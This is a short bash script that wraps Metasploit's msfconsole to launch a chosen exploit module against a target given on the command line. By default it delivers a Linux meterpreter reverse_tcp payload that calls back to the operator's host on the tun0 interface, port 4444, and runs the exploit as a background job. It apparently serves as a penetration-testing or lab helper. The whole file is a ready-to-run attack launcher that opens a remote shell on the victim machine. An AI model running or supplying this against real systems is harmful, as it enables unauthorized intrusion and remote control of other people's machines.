#!/bin/bash
source ./libs/helpers.sh; safe msfconsole
TARGET="${1:?Usage: $0 <target>}"
MODULE="${2:?Usage: $0 <target> <msf_module>}"
PAYLOAD="${3:-linux/x86/meterpreter/reverse_tcp}"
LHOST="${4:-tun0}"
LPORT="${5:-4444}"

msfconsole -q -x "
use $MODULE
set RHOSTS $TARGET
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set EXITFUNC thread
exploit -j
exit
"
